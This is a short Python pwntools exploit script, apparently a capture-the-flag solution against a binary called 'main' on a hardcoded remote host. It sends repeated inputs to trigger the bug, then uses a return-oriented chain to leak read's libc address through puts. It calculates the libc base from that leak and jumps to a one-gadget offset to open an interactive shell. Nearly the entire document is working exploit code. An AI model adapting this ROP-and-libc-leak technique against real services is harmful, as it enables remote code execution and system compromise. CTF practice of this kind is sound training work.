from pwn import*
p = process('./main')
p = remote('47.111.96.55',55106)
elf =ELF('./main')
libc =ELF('./libc-2.23.so')
for i in range(16):
	p.sendline('32')
pop_rdi_ret = 0x0000000000401213
payload =  p64(elf.got['read']) + p64(pop_rdi_ret) + p64(elf.got['read']) + p64(elf.plt['puts']) + p64(0x4007D4) + p64(elf.plt['puts'])
p.sendline(payload)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['read']
log.info('LIBC:\t' + hex(libc_base))

payload = '\x00'*8 + p64(libc_base + 0xF1207)
p.sendline(payload)
p.interactive()
